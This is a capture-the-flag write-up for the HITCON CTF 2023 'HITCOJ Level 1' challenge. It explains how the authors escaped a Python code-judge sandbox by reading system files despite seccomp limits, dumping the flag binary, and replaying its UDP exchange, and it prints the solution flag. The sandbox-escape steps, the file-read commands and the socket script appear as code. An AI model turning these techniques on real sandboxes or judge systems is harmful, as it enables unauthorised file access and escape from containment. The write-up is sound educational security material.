---
title: "HITCON CTF 2023 Misc Level 1"
date: 2023-09-11T00:20:49+02:00
author: l0w3
---

## Misc Challenge HITCON CTF: HITCOJ Level 1

In this challenge we are presented with a Judge system that reminds us to those used on Competitive Programming, where you have a challenge to solve with your code and when you submit it, it tells you if your answer is correct or not.

### What we have

The Judge system source code was available on the [GitHub](https://github.com/QingdaoU/Judge) of the author.

We were also guided to solve it, since the challenge explicitly said:
> Execute /getflag give me flag to get the flag

With that info, we can start to think of the solution.

### Test the waters

First of all, we tried the basics, things that might seem obvious, but, as the old CS saying says:
>Low-Hanging fruit is the sweetest

We decided to try things like:
```python
import os
import process
os.system("ls /") # noup
os.execv("ls /") # noup
subprocess.run(["ls", "/"]) # noup
```
Unfortunately, here the old farmers saying was the correct one:
>Low-Hanging fruit is often rotten

Looking at the doc sourcecode of the app gives a sense of why is not this working:
```c
=== SNIP ===
int general_seccomp_rules(struct config *_config) {
    int syscalls_blacklist[] = {SCMP_SYS(clone),
                                SCMP_SYS(fork), SCMP_SYS(vfork),
                                SCMP_SYS(kill), 
#ifdef __NR_execveat
                                SCMP_SYS(execveat)
#endif
=== SNIP ===
```
As we can see, this syscalls are blacklisted, so we can't work out with them, so lets try with other solutions.

A bit of research lead to finding that, although not being able to list the content of the `/` directory with the command `ls`, we can list it with the command `listdir("/")`.

```python
import os

os.listdir("/")
```

```text
lib var boot run mnt sbin proc lib32 media srv libx32 bin usr home sys lib64 opt dev root etc tmp .dockerenv entrypoint.sh getflag
```

Awesome! It looks that we can actually list the content of the directory.
Let's see if we can open the files to read them:
```python
print(open("/entrypoint.sh").read())
```
```sh
#!/bin/bash


if [[ "$$" != 1 ]]; then
    # pls don't do this
    exit
fi

workdir="/run/workdir"
judgedir="/run/judge"
testdir="$judgedir/testcases"

result_path="$judgedir/result.log"
src_path="$workdir/submission.py"
exe_path="/usr/bin/python3"

mkdir "$workdir"
chmod 777 "$workdir"

cd "$workdir"

judge_test () {
    test_name="$1"
    real_input_path="$testdir/$test_name"

    input_file="./$test_name"
    output_file="./$test_name.out"
    status_file="./$test_name.json"

    ln -s "$real_input_path" "$input_file"
    touch "$output_file" "$status_file"
    chmod 600 "$status_file"

    /usr/lib/libjudger.so \
        --max_cpu_time=1000 \
        --max_real_time=2000 \
        --max_memory=67108864 \
        --max_stack=67108864 \
        --max_output_size=65536 \
        --exe_path="$exe_path" \
        --args="-B" \
        --args="$src_path" \
        --env="PYTHONIOENCODING=utf-8" \
        --input_path="$input_file" \
        --output_path=/dev/stdout \
        --error_path=/dev/null \
        --log_path=/dev/stderr \
        --status_path="$status_file" \
        --seccomp_rule_name=general \
        --uid=1337 \
        --gid=1337 \
        | base64 -w0 > "$output_file"

    jq \
        --arg test "$test_name" \
        --rawfile output "$output_file" \
        -c -M \
        '.test = $test | .output = $output' \
        "$status_file" \
        >> "$result_path"

    rm -f "$input_file" "$output_file" "$status_file"
}

for test_file in $(ls "$testdir"); do
    judge_test "$test_file"
done
```

OK! So we achieved arbitrary file read! Next thing we thought about was to exfiltrate the `getflag` binary and reverse it so we could potentially grab the flag from there.

```python
print(open("/getflag").read().hex())
```
This produced a binary file that we could actually execute and reverse-engineer.

A swallow Reversing indicates us that it was opening a socket to the `172.12.34.56` IP to some port in order to do some things. Since it was a networking thing, we used Wireshark and ran the program to see what was doing with this connection.

What we found out is that the program connected to `172.12.34.56` and port `1337`, and binded on port `321`.

The program also sended a 256 bytes long random data string, and then XORed that incomming data to give it in clear text.

With this info, we agreed that we could potentially replicate that behaviour on a python program so that the judger executes it an hope to get some data.

@inesdv crafted this beautiful python code that did exactly that:

```python
import socket

try:
    ip = "172.12.34.56"
    port = 1337
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.settimeout(0.5)
    client.bind(("0.0.0.0", 321))

    randomdata = b"A" * 256

    client.sendto(randomdata, (ip, port))
 
    response, _ = client.recvfrom(256)
    print(f"Received: {response.decode('utf-8')}")
    client.close()


except Exception as e:
    print(e)
```

And, TACHAN...
```text
3b292835222e2f3a2d2437242d701e1e281e32292e342d251e2f2e351e292037241e343224251e36292835242d2832351e322422222e2c317b693c4b
```
This string is the hex xor of the flag, so we just have to xor it again and transform to ASCII. [CyberChef](https://cyberchef.org/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'A'%7D,'Standard',false)&input=M2IyOTI4MzUyMjJlMmYzYTJkMjQzNzI0MmQ3MDFlMWUyODFlMzIyOTJlMzQyZDI1MWUyZjJlMzUxZTI5MjAzNzI0MWUzNDMyMjQyNTFlMzYyOTI4MzUyNDJkMjgzMjM1MWUzMjI0MjIyMjJlMmMzMTdiNjkzYzRi)

```text
flag: hitcon{level1__i_should_not_have_used_whitelist_seccomp:(}
```

Thanks to all who helpped on this challenge. Special mention to
- inesdv
- navajo
- bubbasm